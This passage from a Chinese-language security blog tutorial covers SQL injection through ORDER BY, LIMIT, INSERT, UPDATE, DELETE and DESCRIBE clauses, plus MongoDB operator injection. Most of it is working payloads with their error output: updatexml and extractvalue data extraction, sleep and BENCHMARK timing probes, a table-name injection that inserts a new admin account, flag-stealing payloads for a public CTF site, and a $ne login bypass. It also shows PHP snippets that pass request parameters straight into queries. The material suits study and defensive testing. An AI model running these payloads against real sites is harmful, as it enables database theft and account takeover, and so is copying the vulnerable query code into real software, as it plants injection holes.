</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=k>order</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=mi>1</span><span class=o>|</span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,</span><span class=k>database</span><span class=p>(),</span><span class=mi>0</span><span class=n>x7e</span><span class=p>),</span><span class=mi>0</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>1105 - XPATH syntax error: ‘~sectest~’, Time: 0.000000s</p><h5 id=12142-利用延时>12.1.4.2 利用延时</h5><div class=highlight id=id-32><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$res</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$conn</span><span class=p>,</span> <span class=s2>&#34;SELECT title FROM wp_news GROUP BY </span><span class=si>${</span><span class=nv>_GET[&#39;title&#39;]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>);</span></span></span></code></pre></td></tr></table></div></div><p>经过测试可以发现，<code>?title=id desc,(if(1，sleep(1),1))</code> 会让页面迟 1 秒，于是可以利用时间注入获取相关数据。</p><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-pencil-alt fa-fw" aria-hidden=true></i>注意<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content>该方法只能用在 mysql 5 上，mysql 8 上失效</div></div></div><h5 id=12143-利用----位运算符进行-order-by>12.1.4.3 利用 & | ^ 位运算符进行 order by</h5><div class=highlight id=id-33><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>--布尔型盲注
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=k>order</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>id</span><span class=o>|</span><span class=p>(</span><span class=k>if</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>1</span><span class=p>))</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--id 和 if 返回的结果进行按位与进行 order by 根据时间判断
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=k>order</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=mi>1</span><span class=o>|</span><span class=k>if</span><span class=p>(</span><span class=k>database</span><span class=p>()</span><span class=w> </span><span class=n>regexp</span><span class=w> </span><span class=s2>&#34;sectest&#34;</span><span class=p>,</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>),</span><span class=mi>0</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><h5 id=12144-利用括号闭合进行联合查询>12.1.4.4 利用括号闭合进行联合查询</h5><p>前提是前句查询必须带有括号。</p><p><code>(select * from person order by 1) union (select 1,2,3)</code></p><p><strong>Demo</strong></p><p><a href="https://chall.tasteless.eu/level1/index.php?dir=asc" target=_blank rel="external nofollow noopener noreferrer">https://chall.tasteless.eu/level1/index.php?dir=asc</a></p><p>payload: <code>?dir=,3)union(select%201,flag%20from%20level1_flag)%23</code></p><h4 id=1215-注入点在-limit-后>12.1.5 注入点在 LIMIT 后</h4><p>LIMIT 后的注入判断比较简单，通过更改数字大小，页面会显示更多或者更少的记录数。由于语法限制，前面的字符注入方式不可行（LIMIT 后只能是数字），在整个 SQL 语句没有 ORDER BY 关键字的情况下，可以直接使用 UNION 注入。</p><p>另外，可根据 SELECT 语法，通过加入 PROCEDURE 来尝试注入，这类语句只适合 MySQL 5.6 前的版本，</p><p><code>select id from wp_news limit 2 procedure analyse(extractvalue(1,concat(0x7e,version())),1)</code></p><p>也可以进行时间盲注</p><p><code>procedure analyse((select extractvalue(1,concat(0x3a,(if(mid(version(),1,1) LIKE 5, BENCHMARK(500000, SHA(1)), 1))))),1)</code></p><p>也可以直接写文件 <code>into outfile</code></p><h3 id=122-insert-注入>12.2 INSERT 注入</h3><p>通常，注入位于字段名或者字段值的地方，且没有回显信息</p><h4 id=1221-注入点位于-table_name>12.2.1 注入点位于 table_name</h4><p>如果能够通过注释符注释后续语句，则可直接插入特定数据到想要的表内，如管理员表。例如，对于如下 SQL 语句：</p><p><code>$res = mysqli_query($conn, "INSERT INTO {$_GET['table']} VALUES(2,2,2,2)");</code></p><p>开发者预想的是，控制 table 的值为 wp_news，从而插入新闻表数据。由于可以控制表名，可以访问 <code>?table=wp_user values(2，'newadmin'，'newpass')%23</code>，直接插入管理员。</p><h4 id=1222-注入点位于-values>12.2.2 注入点位于 VALUES</h4><h5 id=12221-insert-延时>12.2.2.1 INSERT 延时</h5><div class=highlight id=id-34><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>INSERT</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=n>password</span><span class=p>,</span><span class=k>year</span><span class=p>)</span><span class=w> </span><span class=k>VALUES</span><span class=p>(</span><span class=s2>&#34;test1&#34;</span><span class=p>,</span><span class=s2>&#34;122&#34;</span><span class=p>,</span><span class=s2>&#34;3&#34;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>INSERT</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=n>password</span><span class=p>,</span><span class=k>year</span><span class=p>)</span><span class=w> </span><span class=k>VALUES</span><span class=p>(</span><span class=s2>&#34;test1&#34;</span><span class=p>,</span><span class=s2>&#34;122&#34;</span><span class=p>,</span><span class=s2>&#34;3&#34;</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>INSERT</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=n>password</span><span class=p>,</span><span class=k>year</span><span class=p>)</span><span class=w> </span><span class=k>VALUES</span><span class=p>(</span><span class=s2>&#34;test1&#34;</span><span class=p>,</span><span class=s2>&#34;122&#34;</span><span class=p>,</span><span class=s2>&#34;3&#34;</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span></span></span></code></pre></td></tr></table></div></div><h5 id=12222-insert-报错>12.2.2.2 INSERT 报错</h5><div class=highlight id=id-35><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>INSERT</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=n>password</span><span class=p>,</span><span class=k>year</span><span class=p>)</span><span class=w> </span><span class=k>VALUES</span><span class=p>(</span><span class=s2>&#34;test1&#34;</span><span class=p>,</span><span class=s2>&#34;122&#34;</span><span class=k>or</span><span class=w> </span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,</span><span class=k>DATABASE</span><span class=p>()),</span><span class=mi>0</span><span class=p>),</span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>INSERT</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=n>password</span><span class=p>,</span><span class=k>year</span><span class=p>)</span><span class=w> </span><span class=k>VALUES</span><span class=p>(</span><span class=s2>&#34;test1&#34;</span><span class=p>,</span><span class=s2>&#34;122&#34;</span><span class=k>and</span><span class=w> </span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,</span><span class=k>DATABASE</span><span class=p>()),</span><span class=mi>0</span><span class=p>),</span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>INSERT</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=n>password</span><span class=p>,</span><span class=k>year</span><span class=p>)</span><span class=w> </span><span class=k>VALUES</span><span class=p>(</span><span class=s2>&#34;test1&#34;</span><span class=p>,</span><span class=s2>&#34;122&#34;</span><span class=o>&amp;</span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,</span><span class=k>DATABASE</span><span class=p>()),</span><span class=mi>0</span><span class=p>),</span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>INSERT</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=n>password</span><span class=p>,</span><span class=k>year</span><span class=p>)</span><span class=w> </span><span class=k>VALUES</span><span class=p>(</span><span class=s2>&#34;test1&#34;</span><span class=p>,</span><span class=s2>&#34;122&#34;</span><span class=o>|</span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,</span><span class=k>DATABASE</span><span class=p>()),</span><span class=mi>0</span><span class=p>),</span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>INSERT</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=n>password</span><span class=p>,</span><span class=k>year</span><span class=p>)</span><span class=w> </span><span class=k>VALUES</span><span class=p>(</span><span class=s2>&#34;test1&#34;</span><span class=p>,</span><span class=s2>&#34;122&#34;</span><span class=o>+</span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,</span><span class=k>DATABASE</span><span class=p>()),</span><span class=mi>0</span><span class=p>),</span><span class=mi>1</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>result: 1105 - XPATH syntax error: ‘~sectest’, Time: 0.000000s</p><p><strong>Demo</strong></p><p><a href=http://chall.tasteless.eu/level15/ target=_blank rel="external nofollow noopener noreferrer">http://chall.tasteless.eu/level15/</a></p><p>payload</p><div class=highlight id=id-36><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>insert</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>tables</span><span class=w> </span><span class=k>values</span><span class=w> </span><span class=p>(</span><span class=s1>&#39;\&#39;</span><span class=p>,</span><span class=s1>&#39;,(select flag from level15_flag))# &#39;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><ul><li>name: <code>\</code></li><li>text: <code>,(select flag from level15_flag))#</code></li></ul><h3 id=123-update-注入>12.3 UPDATE 注入</h3><h4 id=1231-update-报错>12.3.1 UPDATE 报错</h4><div class=highlight id=id-37><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>update</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=n>password</span><span class=o>=</span><span class=s2>&#34;zxczxcxzc&#34;</span><span class=k>or</span><span class=w> </span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,</span><span class=k>database</span><span class=p>()),</span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>9</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>update</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=n>password</span><span class=o>=</span><span class=s2>&#34;zxczxcxzc&#34;</span><span class=k>or</span><span class=p>(</span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,</span><span class=k>database</span><span class=p>()),</span><span class=mi>1</span><span class=p>))</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>9</span></span></span></code></pre></td></tr></table></div></div><h4 id=1332-update-延时>13.3.2 UPDATE 延时</h4><div class=highlight id=id-38><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>update</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=n>password</span><span class=o>=</span><span class=s2>&#34;2&#34;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>9</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>update</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=n>password</span><span class=o>=</span><span class=s2>&#34;00000000&#34;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>if</span><span class=p>((</span><span class=k>LENGTH</span><span class=p>(</span><span class=k>database</span><span class=p>())</span><span class=o>=</span><span class=mi>8</span><span class=p>),</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>),</span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>9</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--password处必须为数字型</span></span></span></code></pre></td></tr></table></div></div><h3 id=124-delete-注入>12.4 DELETE 注入</h3><h4 id=1241-delete-延时>12.4.1 DELETE 延时</h4><div class=highlight id=id-39><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>delete</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>21</span><span class=w> </span><span class=k>or</span><span class=o>/</span><span class=k>and</span><span class=p>(</span><span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>))</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>delete</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>21</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>if</span><span class=p>((</span><span class=k>LENGTH</span><span class=p>(</span><span class=k>database</span><span class=p>()</span><span class=o>=</span><span class=mi>7</span><span class=p>)),</span><span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>),</span><span class=mi>0</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><h4 id=1342-delete-报错>13.4.2 DELETE 报错</h4><div class=highlight id=id-40><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>delete</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>21</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,</span><span class=k>database</span><span class=p>()),</span><span class=mi>1</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><h3 id=135-descibe-注入>13.5 DESCIBE 注入</h3><blockquote><p>{DESCRIBE | DESC} table_name [col_name | wild]</p><p>DESCRIBE 提供有关一个表的列信息。col_name 可以是一个列名或是一个包含 SQL 通配符字符 <code>%</code>和 <code>_</code> 的字符串。</p></blockquote><p>源代码：</p><div class=highlight id=id-41><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>require</span><span class=p>(</span><span class=s2>&#34;config.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$table</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;table&#39;</span><span class=p>]</span><span class=o>?</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;table&#39;</span><span class=p>]</span><span class=o>:</span><span class=s2>&#34;test&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$table</span> <span class=o>=</span> <span class=nx>Filter</span><span class=p>(</span><span class=nv>$table</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$mysqli</span><span class=p>,</span><span class=s2>&#34;desc `secret_</span><span class=si>{</span><span class=nv>$table</span><span class=si>}</span><span class=s2>`&#34;</span><span class=p>)</span> <span class=k>or</span> <span class=nx>Hacker</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$sql</span> <span class=o>=</span> <span class=s2>&#34;select &#39;flag{xxx}&#39; from secret_</span><span class=si>{</span><span class=nv>$table</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$ret</span> <span class=o>=</span> <span class=nx>sql_query</span><span class=p>(</span><span class=nv>$sql</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$ret</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>desc 可以接受两个参数，可以过掉第一个检测。</p><p>反引号在 union select 中可以当做空格。</p><p>payload:</p><p>?table=test`` union select database() limit 1 offset 1</p><h2 id=13nosql-注入>13、NoSQL 注入</h2><h3 id=131-定义>13.1 定义</h3><p>泛指非关系型的数据库。随着互联网 web2.0 网站的兴起，在高可用，高并发压力下，传统数据库已经不能满足需求，用于解决大数据应用和超大规模数据存储的问题。</p><p>主要代表：MongDB、 Redis、 Memcache</p><p>以 MongDB 为例，它是一个面向文档存储的数据库，以键值对形式存在</p><div class=highlight id=id-42><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;xunruo&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;age&#34;</span><span class=p>:</span> <span class=mi>26</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;status&#34;</span><span class=p>:</span> <span class=s2>&#34;A&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;groups&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;news&#34;</span><span class=p>,</span> <span class=s2>&#34;sports&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><h3 id=132-注入原理一>13.2 注入原理一</h3><ol><li>注入过程</li></ol><p>以用户身份验证为例，POST 请求：</p><div class=highlight id=id-43><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>username=test&amp;password=123456</span></span></code></pre></td></tr></table></div></div><p>后端程序语言，我们希望是这样的：</p><div class=highlight id=id-44><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>db.users.find({username: &#39;test&#39;, password: &#39;123456&#39;})</span></span></code></pre></td></tr></table></div></div><p>因此，我们可以构造如下请求：</p><div class=highlight id=id-45><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>username[$ne]=1&amp;password[$ne]=1</span></span></code></pre></td></tr></table></div></div><p>实际后端程序运行：</p><div class=highlight id=id-46><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>db.logins.find({username:{$ne:1}, password:{$ne:1}})</span></span></code></pre></td></tr></table></div></div><p>类比传统 SQL 语句：</p><div class=highlight id=id-47><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>select * from logins where username &lt;&gt; 1 and password &lt;&gt; 1</span></span></code></pre></td></tr></table></div></div><h3 id=133-注入原理二>13.3 注入原理二</h3><p>如果在编程语言中不够谨慎，也可能产生像 sqli 注入那样的截断问题，但是这是在程序语言中而非 SQL 语句中：</p><div class=highlight id=id-48><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>$script</span><span class=o>=</span> <span class=s2>&#34;try{
</span></span></span><span class=line><span class=cl><span class=s2>	var key = db.users.find({username: &#39;test&#39;}).value;
</span></span></span><span class=line><span class=cl><span class=s2>	var inputValue = &#39;&#34;</span><span class=p>.</span><span class=nx>$input</span><span class=p>.</span><span class=s2>&#34;&#39;;
</span></span></span><span class=line><span class=cl><span class=s2>	if(key == inputValue) {
</span></span></span><span class=line><span class=cl><span class=s2>		return(&#39;match&#39;);
</span></span></span><span class=line><span class=cl><span class=s2>}}&#34;</span><span class=p>;</span></span></span></code></pre></td></tr></table></div></div><p>当输入 <code>';return key;//</code> -> <code>var inputValue='';return key;//'</code>，导致 inputValue 为空，直接返回 key 字段</p><p>参考文章：
<a href=https://www.geekby.site/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/ target=_blank rel="external nofollow noopener noreferrer">SQl注入相关知识</a></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span title="更新于 2023-03-30 17:12:00">更新于 2023-03-30&nbsp;</span></div><div class=post-info-license><span><a rel="license external nofollow noopener noreferrer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fa-solid fa-tags fa-fw me-1" aria-hidden=true></i><a href=/tags/sql%E6%B3%A8%E5%85%A5/ class=post-tag>SQL注入</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/post/543fca94/ class=post-nav-item rel=prev title=Nmap-使用基础><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i>Nmap-使用基础</a>
<a href=/post/0c6b621a/ class=post-nav-item rel=next title=JavaSec-Java反射>JavaSec-Java反射<i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></div><div id=comments><div id=twikoo></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://twikoo.js.org/ rel="external nofollow noopener noreferrer">Twikoo</a>.</noscript></div></article></main><footer class=footer><div class=footer-container><div class="footer-line copyright" itemscope itemtype=http://schema.org/CreativeWork><i class="fa-regular fa-copyright fa-fw" aria-hidden=true></i>
<span itemprop=copyrightYear>2023</span><span class=author itemprop=copyrightHolder>
<a href=https://xunruo.top target=_blank rel="external nofollow noopener noreferrer">xunruo</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div><div class="footer-line statistics"></div></div></footer></div><div class=widgets><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role=button aria-label=回到顶部><i class="fa-solid fa-arrow-up fa-fw" aria-hidden=true></i><span class=variant-numeric>0%</span></div><div class="fixed-button view-comments d-none" role=button aria-label=查看评论><i class="fa-solid fa-comment fa-fw" aria-hidden=true></i></div></div><div id=mask></div><noscript><div class=noscript-warning>FixIt 主题在启用 JavaScript 的情况下效果最佳。</div></noscript></div><div class=assets><link rel=stylesheet href=https://npm.elemecdn.com/lightgallery@2.6.1/css/lightgallery-bundle.min.css><link rel=stylesheet href=https://npm.elemecdn.com/katex@0.16.2/dist/katex.min.css><link rel=stylesheet href=https://npm.elemecdn.com/xrhugo/public/lib/pace//themes/custom/pace-theme-custom.css><script src=https://npm.elemecdn.com/twikoo@1.6.17/dist/twikoo.all.min.js defer></script><script src=https://npm.elemecdn.com/autocomplete.js@0.38.1/dist/autocomplete.min.js defer></script><script src=https://npm.elemecdn.com/algoliasearch@4.14.2/dist/algoliasearch-lite.umd.js defer></script><script src=https://npm.elemecdn.com/instant.page@5.1.1/instantpage.js async defer type=module></script><script src=https://npm.elemecdn.com/lightgallery@2.6.1/lightgallery.min.js defer></script><script src=https://npm.elemecdn.com/lightgallery@2.6.1/plugins/thumbnail/lg-thumbnail.min.js defer></script><script 